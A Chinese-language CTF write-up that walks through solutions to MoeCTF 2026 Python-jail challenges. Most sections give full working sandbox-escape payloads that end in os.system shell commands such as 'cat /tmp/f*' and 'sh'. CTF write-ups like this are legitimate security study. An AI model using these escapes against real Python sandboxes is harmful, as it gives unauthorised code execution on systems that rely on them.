# MoeCTF 2026 PyJail 不完全解

推荐到 [我的博客](https://nickchen.top/blog/moectf-2026-pyjail/) 获取更好的观看体验。

## Parens? No! (Slopped)

根据 [exec 文档](https://docs.python.org/3/library/functions.html#exec)

> exec(source, /, globals=None, locals=None, *, closure=None)¶
>
> If the globals dictionary does not contain a value for the key `__builtins__`, a reference to the dictionary of the built-in module builtins is inserted under that key. Overriding `__builtins__` can be used to restrict or change the available names, but this is not a security mechanism: the executed code can still access all builtins.

所以直接 `del __builtins__` 后，下一轮的 exec 就被恢复了完整的 builtins，接下来用装饰器或者覆盖 `__getattr__` 都行。

## Parens? No! Revenge！

熟悉 Python 的师傅一定知道在使用 `class foo` 语法定义类时，实际会调用内部构造函数 [`__build_class__`](https://github.com/python/cpython/blob/b38be2e6cf9d989075ab73412c63e003ebad4ff3/Python/bltinmodule.c#L103)，根据 CPython 源码，定义如下。

```c
builtin___build_class__(PyObject *self, PyObject *const *args, Py_ssize_t nargs,
                        PyObject *kwnames)
{
    ...
    PyDoc_STRVAR(build_class_doc,
    "__build_class__(func, name, /, *bases, [metaclass], **kwds) -> class\n\
    \n\
    Internal helper function used by the class statement.");
}
```

这意味着我们可以构造一个函数覆盖原有的 `__build_class__(func, name, /, *bases, [metaclass], **kwds)`，它的返回值就是 class 声明的变量的值，再结合一点装饰器技巧，我们就可以得到以下 payload.

```py
__builtins__.__build_class__=lambda f,n,*a:"".__class__.__class__
@__builtins__.__class__.__class__.__subclasses__
class X: ...
__builtins__.__build_class__=lambda f,n,*a:0
@X.pop
class x: ...
__builtins__.__build_class__=lambda f,n,*a:x.register.__builtins__
@x.register.__builtins__.__class__.items
class Y: ...
exec, input, __import__ = None, None, None
for k, v in Y: exec = v if k == "exec" else exec
for k, v in Y: __import__ = v if k == "__import__" else __import__
for k, v in Y: input = v if k == "input" else input
__builtins__.__build_class__=lambda f,n,*a: "exec waat: "
__builtins__.exec = exec
__builtins__.input = input
@exec
@input
class t:...

__import__("os").system("cat /tmp/f*")
```

 这里我使用了 `().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__` 这条稳定链，需要注意的是由于 `strip` 的存在，无法使用缩进，所以做了一些压行处理。

## Pyjail 笑传之 CallingComesBack

这里的 payload 可以直接用：[Pyjail Cheatsheet · running functions and methods without parenthesis](https://shirajuki.js.org/blog/pyjail-cheatsheet/#running-functions-and-methods-without-parenthesis)

## 双十一

限制只能使用三种给定的字符集，字符集下限定只能使用四种字符，总共不超过 11 种字符，很容易推断出括号，小写字母是必须要使用的。

由于 eval 环境且没有 `_`，所以必然从内置函数入手，找了一圈，能用的几乎只有 `vars` 和 `dir`, 这里我主要用了 `vars`

> vars(object, /)
>
> Return the `__dict__` attribute for a module, class, instance, or any other object with a `__dict__` attribute.
>
> Ref: <https://docs.python.org/3/library/functions.html#vars>

这样第三种字符用符号的话一切都会很自然，我们可以用 `[]==[]` 构造数字 1，用 `[*arr]` 进行一元展开来获取键名列表，从键名列表下标取值，拿到我们想要的 builtins 函数。

```py
def num(i):
    return "([]==[])" + "+([]==[])" * (i - 1)

builtins_dict = f"vars(vars()[[*vars()][{num(6)}]])"
builtins_dict_keys = f"[*{builtins_dict}]"

def getfunc(f):
    for i, ff in enumerate(eval(builtins_dict_keys, globals())):
        if f == ff:
            return f"({builtins_dict}[{builtins_dict_keys}[{num(i)}]])"

user_input = f"{getfunc('breakpoint')}()"
print(user_input)
eval(user_input, globals())
```

## 永不消逝的数字 (Slopped)

总的来说就是用一些能拿到的数字来凑出 `b'breakpoint()'.hex()` 的数值就行，不过我数学不太好，就丢给 DeepSeek 干了。

它先 fuzz 了一遍环境，得到以下数字

```python
__debug__.real                    # 1
chall.__code__.co_flags           # 3
int.__itemsize__                  # 4
handle.__code__.co_nlocals        # 6
chall.__code__.co_stacksize       # 7
tuple.__itemsize__                # 8
daemon_main.__code__.co_stacksize # 10
daemon_main.__code__.co_nlocals   # 11
quit.__firstlineno__              # 13
int.__basicsize__                 # 24
map.__basicsize__                 # 32
bytes.__basicsize__               # 33
type.__itemsize__                 # 40
zip.__basicsize__                 # 48
bytearray.__basicsize__            # 56
str.__basicsize__                  # 64
re.error.__basicsize__             # 72
object.__basicsize__               # 16
```

然后取了 72 (`re.error.__basicsize__`) 作为基数，将目标整数按 72 进制展开：

```python
T = d0 * 72**n + d1 * 72**(n-1) + ... + dn
```

最后优化了一下长度，得到最终 payload, 长度为 1704

```py
int.__itemsize__*re.error.__basicsize__**quit.__firstlineno__*re.error.__basicsize__*re.error.__basicsize__+__debug__.real*re.error.__basicsize__**quit.__firstlineno__*re.error.__basicsize__+quit.__firstlineno__*re.error.__basicsize__**quit.__firstlineno__*re.error.__basicsize__-quit.__firstlineno__*re.error.__basicsize__**quit.__firstlineno__+re.error.__basicsize__*re.error.__basicsize__**quit.__firstlineno__+daemon_main.__code__.co_stacksize*re.error.__basicsize__**daemon_main.__code__.co_nlocals*re.error.__basicsize__+__debug__.real*re.error.__basicsize__**daemon_main.__code__.co_nlocals+__debug__.real*re.error.__basicsize__**daemon_main.__code__.co_nlocals-__debug__.real*re.error.__basicsize__**daemon_main.__code__.co_stacksize+type.__itemsize__*re.error.__basicsize__**daemon_main.__code__.co_stacksize+int.__itemsize__*re.error.__basicsize__**tuple.__itemsize__*re.error.__basicsize__+int.__itemsize__*re.error.__basicsize__**tuple.__itemsize__+zip.__basicsize__*re.error.__basicsize__**tuple.__itemsize__+__debug__.real*re.error.__basicsize__**handle.__code__.co_nlocals+zip.__basicsize__*re.error.__basicsize__**handle.__code__.co_nlocals+__debug__.real*re.error.__basicsize__**int.__itemsize__*re.error.__basicsize__+object.__basicsize__*re.error.__basicsize__**int.__itemsize__*re.error.__basicsize__+zip.__basicsize__*re.error.__basicsize__**int.__itemsize__-quit.__firstlineno__*re.error.__basicsize__**chall.__code__.co_flags+map.__basicsize__*re.error.__basicsize__**chall.__code__.co_flags+bytearray.__basicsize__*re.error.__basicsize__*re.error.__basicsize__+__debug__.real*re.error.__basicsize__+quit.__firstlineno__*re.error.__basicsize__+int.__basicsize__+bytes.__basicsize__
```

## revenge_jail

这道题首先得围绕给的 builtins 入手

```py
safe_builtins ={
    "Exception" : Exception,
    "object" : object,
}
```

迅速在脑袋里和网上搜索相关 trick, `Exception` 的话有两个 trick, 一是结合 `str.format()` 来从异常对象的 `e.obj` 取对象，这里不能 function call 所以不行；二是利用异常对象的栈帧，也就是 `__traceback__.tb_frame`，可以拿到当前帧的 globals, f_back 回溯后也可以取到上层栈帧的 globals（没有被清空的完整对象）

但是我们无法使用 attribute 和 subscript 访问属性，所以 `e.__traceback__.tb_frame` 肯定不行，这里使用了 [match 语句的类模式](https://docs.python.org/zh-cn/3.14/reference/compound_stmts.html?utm_source=chatgpt.com#grammar-token-python-grammar-class_pattern) 来取值并赋值，这里 `object()` 只是作为类模式 `class_pattern: name_or_attr "(" [pattern_arguments ","?] ")"` 语法的一部分，不属于 function call。

一切准备就绪后，使用 `|=` 把上层 globals 合并到本层，就又可以用装饰器正常打了；当然也可以重载运算符。

```py
import ast


class RestrictedNodeVisitor(ast.NodeVisitor):
    def visit_Call(self, _node):
        raise RuntimeError("Function Call Is Not Allowed")

    def visit_Attribute(self, _node):
        raise RuntimeError("Attribute Not Allowed")

    def visit_Subscript(self, _node):
        raise RuntimeError("Subscript Not Allowed")

code = """
try:
    1/0
except Exception as e:
    match e:
        case object(
            __traceback__=object(
                tb_frame=object(
                    f_globals={'__builtins__': thisB},
                    f_back=object(f_builtins=upperB)
                )
            )
        ): pass

thisB |= upperB

import os

match os:
    case object(system=s): pass

# 法1：重载运算符
# class E(Exception):
#     global s
#     __add__ = s

# try: raise E
# except E as e2: e2 + "calc"


# 法2：装饰器，仅在 Linux 下有效
# class M(type):
#     def __fspath__(self):
#         return "whoami"
# @s
# class trigger(metaclass=M): pass
"""
```

## CatBox_revenge

给了一个自定义**对象** `cat`, 自定义对象的方法都是可以被覆盖的，我用到了这篇文章提到的两种重载 [Pyjail Cheatsheet · running functions and methods without parenthesis](https://shirajuki.js.org/blog/pyjail-cheatsheet/#running-functions-and-methods-without-parenthesis)

```py
[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]] # 不需要传参
[obj["print(123)"] for obj.__class__.__getitem__ in [eval]] # 一个字符串参数
```

然后找一条链子就可以开绕了，这里因为传值不便就没有用稳定链，131 这个数字需要写个脚本 fuzz。空格不允许可以用 `[[a]for[b]in[[c]]]` 或 `[a\tfor\tb\tin\tc]` (`\t`, `\r` 替代空格) 来绕过，`__` 用常见的 unicode 绕过，不能用引号就从 `__doc__` 取。

```py
[
    d:=[]._＿doc＿_,
    o:=d[32], # o
    s:=d[17], # s
    h:=d[54], # h
    a:=[[+cat][0]for[cat._＿class＿_._＿pos＿_]in[[[]._＿class＿_._＿bases＿_[0]._＿subclasses＿_]]], # []._＿class＿_._＿bases＿_[0]._＿subclasses＿_()
    lm:=a[0][131].load_module, # _frozen_importlib.BuiltinImporter.load_module
    os:=[[cat[o+s]][0]for[cat._＿class＿_._＿getitem＿_]in[[lm]]][0],
    [[cat[s+h]][0]for[cat._＿class＿_._＿getitem＿_]in[[os.system]]]
]
```

## Undefined

jail 设计的主要思路还是 ban 掉 function call，我们现在掌握的主要绕过方式也就几种：

- 装饰器
- 覆写内置函数
- 运算符重载

function 和 class 都没了，所以大概装饰器没有凭依，覆写内置函数首先得拿到内置函数，运算符重载也一样，想想不太行...

ban 的这么狠很难不让人去翻还有什么没被 ban 掉，于是我 `ctrl+click` 进相关定义 (`ast.pyi`), 经过一番搜寻找到这些还能用：

```py
def visit_AsyncFunctionDef(self, node: AsyncFunctionDef) -> Any: ...

def visit_Match(self, node: Match) -> Any: ...
def visit_Lambda(self, node: Lambda) -> Any: ...
def visit_Attribute(self, node: Attribute) -> Any: ...
def visit_Subscript(self, node: Subscript) -> Any: ...
```

注意到 `AsyncFunctionDef` 还活着，装饰器又能用了。

```py
import ast

class RestrictedNodeVisitor(ast.NodeVisitor):
    def visit_Call(self, node):
        print(f"Function call to {node.func} is not allowed")
        # raise RuntimeError("Function Call Is Not Allowed")
        # comment for debug

    def visit_FunctionDef(self, node):
        raise RuntimeError("Function Definition Is Not Allowed")

    def visit_ClassDef(self, node):
        raise RuntimeError("Class Definition Is Not Allowed")

    def visit_NamedExpr(self, node):
        raise RuntimeError("Walrus Is Not Allowed")

    def visit_Assign(self, node):
        raise RuntimeError("Assign Is Not Allowed")

    def visit_AnnAssign(self, node):
        raise RuntimeError("AnnAssign Is Also Not Allowed")

code = """
match ().__new__.__new__.__self__:
    case object:...
match object.__class__:
    case type:...
match object.__doc__:
    case obj:...
match ().__class__.__class__.__subclasses__:
    case sbcls:...
match []:
    case l1:...
match []:
    case l2:...
match (lambda x: ().__class__.__class__):
    case tcc:...
match (lambda x: "sh"):
    case sh: ...
match (lambda x: "os"):
    case os: ...
match (lambda x: x.system):
    case gs: ...

    
@l1.append
@sbcls
@tcc
async def f():...

@l2.append
@l1[0][0].register.__builtins__["__import__"]
@os
async def f():...

@l2[0].system
@sh
async def f():...
"""
```

## density

又一个 ast 沙箱，builtins 清空，禁止 function call、赋值、下标访问，黑名单了 `\t` 和 ` `，意味着不能用缩进语法，`\n` 可以用 `\r` 替代，`\\` 影响不大，`@` 意味着不能用装饰器了。

排除法得到我们只有运算符重载可用了，我们已知的 payload 需要有一个 mutable 的对象，但是 builtins 为空，`class` 语法不可用，type 也没有，有也没用。

于是自然想到只能恢复 builtins，或者从继承链上找个 mutable 对象了。

经过一番漫无目的的寻找，我想起来了[生成器栈帧逃逸](https://dummykitty.github.io/posts/pyjail-bypass-11-%E5%88%A9%E7%94%A8%E7%94%9F%E6%88%90%E5%99%A8%E6%A0%88/#%E7%94%9F%E6%88%90%E5%99%A8%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8-payload)这个 trick，这里改一改就能恢复 builtins。

```py
class RestrictedNodeVisitor(ast.NodeVisitor):
    def visit_Call(self, node):
        print(f"Function Call {node} Is Not Allowed")
        # raise RuntimeError("Function Call Is Not Allowed")

    def visit_Assign(self, node):
        raise RuntimeError("Assign Is Not Allowed")

    def visit_Subscript(self, node):
        raise RuntimeError("Subscript Is Not Allowed")
blacklist = '@ \t\n\\'
code = """
[
q:=((q.gi_frame.f_back.f_back.f_builtins)for[_]in[[1]]),
g:=[*q]
]
for btlns in g: __builtins__|=btlns;
[-quit for quit.__class__.__neg__ in [breakpoint]]
""".replace("\n", "\r").replace(" ", "\x0c")
print(base64.b64encode(code.encode()).decode())
```

## registers

我在品鉴完 NNS CTF 的 pyjail 题 "silent" 后，分享给了星走路师傅（

他做了之后来了灵感，基于那道题的 `None.__new__.__new__.__self__==object` trick 出了这道题；
然后我再次品鉴完之后觉得星走路这题出的比 silent 还要好玩。

这道题链子不难，主要是手工调试比较复杂。以下是我写的 payload 生成器：

```py
q = []


def g(a, b):
    q.append(f"get {a} {b}")


def c(a, b, d):
    q.append(f"call {a} {b} {d}")


def m(a, b):
    q.append(f"move {a} {b}")


# ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")

g(0, "__new__")
g(0, "__new__")
g(0, "__self__")  # 0 object
g(1, "__new__")
g(1, "__new__")
g(1, "__self__")
g(1, "__dir__")
c(1, 0, 2)
c(1, 0, 1)  # 1 object.__dir__()
g(2, "__new__")
g(2, "__self__")
g(2, "pop")  # 2 list.pop
c(2, 1, 3)  # 3 __class__
# for _ in range(38):
for _ in range(37):  # remote
    c(2, 1, 4)  # 4 __subclasses__
g(0, "__dict__")
g(0, "get")  # 0 object.__dict__.get
c(0, 3, 0)  # 0 object.__dict__.get("__class__")
# 2 <attribute '__class__' of 'object' objects>
g(0, "__get__")
g(5, "__new__")
g(5, "__new__")
g(5, "__self__")  # 5 object
c(0, 5, 2)  # 2 type
m(2, 5)  # 5 type
g(2, "__dict__")
g(2, "get")  # 2 type.__dict__.get
c(2, 4, 2)  # 2 type.__dict__.get("__subclasses__")
c(2, 5, 2)  # 2 type.__dict__.get("__subclasses__")(type)
# local is [<class 'abc.ABCMeta'>]
# remote is [<class 'abc.ABCMeta'>, <class 'enum.EnumType'>]
g(1, "__new__")
g(1, "__self__")
g(1, "pop")  # 1 list.pop
g(5, "__dict__")
g(5, "get")
c(1, 2, 5)  # remote uncomment this line
c(1, 2, 5)  # 5 <class 'abc.ABCMeta'>
g(2, "__new__")
g(2, "__self__")  # 2 list
m(5, 4)  # 4 abc.ABCMeta
g(5, "__dir__")  # 5 abc.ABCMeta.__dir__
c(5, 4, 3)  # 3 object.__dir__(abc.ABCMeta)

# for _ in range(51):
for _ in range(49):  # remote
    c(1, 3, 5)  # 5 register

g(4, "__dict__")
g(4, "get")
c(4, 5, 4)  # 4 abc.ABCMeta.register


c(0, 4, 2)  # 2 function
c(0, 4, 3)  # 3 function
g(2, "__dir__")  # 2 function.__dir__
c(2, 4, 2)  # 2 function.__dir__(abc.ABCMeta.register)

# for _ in range(31):
for _ in range(30):  # remote
    c(1, 2, 5)  # __builtins__


g(3, "__dict__")
g(3, "get")
c(3, 5, 3)
g(3, "__get__")
c(3, 4, 2)  # 2 builtins

m(2, 4)  # 4 builtins
g(2, "__new__")
g(2, "__self__")  # 2 dict

# FUCK mappingproxy
g(2, "__dict__")  # 2 dict.__dict__
m(2, 5)  # 5 dict.__dict__ (mappingproxy inst)
g(2, "__new__")
g(2, "__self__")
g(2, "__dir__")  # 2 mappingproxy.__dir__
# remote ['__new__', '__repr__', '__hash__', '__str__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__iter__', '__or__', '__ror__', '__ior__', '__len__', '__getitem__', '__contains__', 'get', 'keys', 'values', 'items', 'copy', '__class_getitem__', '__reversed__', '__doc__', '__getattribute__', '__setattr__', '__delattr__', '__init__', '__reduce_ex__', '__reduce__', '__getstate__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
c(2, 5, 3)  # 3 mappingproxy.__dir__(dict.__dict__)

for _ in range(20):
    c(1, 3, 0)  # 0 keys

g(5, "get")
c(5, 0, 5)  # 5 mappingproxy.keys
c(5, 4, 2)  # 2 builtins.keys()
g(3, "__new__")
g(3, "__self__")
c(3, 2, 3)  # 3 list(builtins.keys())
# remote is ['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'aiter', 'len', 'locals', 'max', 'min', 'next', 'anext', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None', 'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod', 'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip', '__debug__', 'BaseException', 'BaseExceptionGroup', 'Exception', 'GeneratorExit', 'KeyboardInterrupt', 'SystemExit', 'ArithmeticError', 'AssertionError', 'AttributeError', 'BufferError', 'EOFError', 'ImportError', 'LookupError', 'MemoryError', 'NameError', 'OSError', 'ReferenceError', 'RuntimeError', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SystemError', 'TypeError', 'ValueError', 'Warning', 'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'BytesWarning', 'DeprecationWarning', 'EncodingWarning', 'FutureWarning', 'ImportWarning', 'PendingDeprecationWarning', 'ResourceWarning', 'RuntimeWarning', 'SyntaxWarning', 'UnicodeWarning', 'UserWarning', 'BlockingIOError', 'ChildProcessError', 'ConnectionError', 'FileExistsError', 'FileNotFoundError', 'InterruptedError', 'IsADirectoryError', 'NotADirectoryError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'IndentationError', 'IndexError', 'KeyError', 'ModuleNotFoundError', 'NotImplementedError', 'RecursionError', 'UnboundLocalError', 'UnicodeError', 'BrokenPipeError', 'ConnectionAbortedError', 'ConnectionRefusedError', 'ConnectionResetError', 'TabError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeTranslateError', 'ExceptionGroup', 'EnvironmentError', 'IOError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help']


# for _ in range(132):
for _ in range(129):  # remote
    c(1, 3, 2)  # 2 input
# q.append("show")
for _ in range(8):
    c(1, 3, 5)  # 5 exec


m(4, 0)
g(4, "get")
c(4, 2, 4)  # 4 input
g(0, "get")
c(0, 5, 0)  # 0 exec

# exec(input())
c(4, 2, 3)
# __import__("os").system("cat /tmp/f*")
c(0, 3, 0)


# payload = "\n".join(q + ["show", "debug"])
payload = "\n".join(q)
print(payload)
# import chall

# chall.chall(payload)
```

值得注意的几个 tricks：

要走正常链子，我们几乎绕不开要走到 `__reduce_ex__` 或是 `__subclasses__`，但是他们都超长了。

我们就必须找个办法绕过字数限制访问属性。

已知 `__dir__` 可以遍历属性名列表，我们不难通过不断 `pop` 拿到想要的属性名，但是怎么获取呢？常用的 `__getattribute__` 太长了。

> When you write `x.y`, the `x.__getattribute__()` method is invoked. The default implementation of `__getattribute__()` does the following:
>
> First, it checks if y is a data descriptor. If so, it returns the result of its `__get__()` method.
>
> Next, it tries to find 'y' in the instance dictionary of x and return it.
>
> Next, it checks if y is a non_data descriptor. If so, it returns the result of its `__get__()` method.
>
> Next, it tries to find 'y' in the class dictionary of the type of x and return it.
>
> Finally, if none of the above worked, it raises an AttributeError.

经过搜索 `__getattribute__` 的实际实现，得知如果参数 "is a data descriptor"（descriptor: 具有 `__set__`, `__get__` 或 `__delete__` 中一个或更多方法的对象），我们就能通过调用 `descriptor.__get__(obj)` 拿到属性（不仅如此，还能设置和删除属性），这个方法在字数限制内。(Ref: <https://www.cnblogs.com/andy1031/p/10923834.html>)

那么 data descriptor 怎么来呢？Python 内部自带的 staticmethod, classmethod, property，super 等都是描述器。`object.__dict__.get("__class__")` 拿到的 attribute 对象也不例外。（Ref: <https://zhuanlan.zhihu.com/p/52708890>）

现在我们有了在继承链上游走的力量，很轻松就能解出剩下的部分。需要注意，`().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")` 链子走到 `.register` 这一步后直接 `__dict__` 是取不到任何东西的，也不能用 `object.__dict__` 来拿 builtins, 它没有这个 descriptor, 必须通过 `function.__dict__.get("__builtins__").__get__(<-snipped->.register)` 来取。
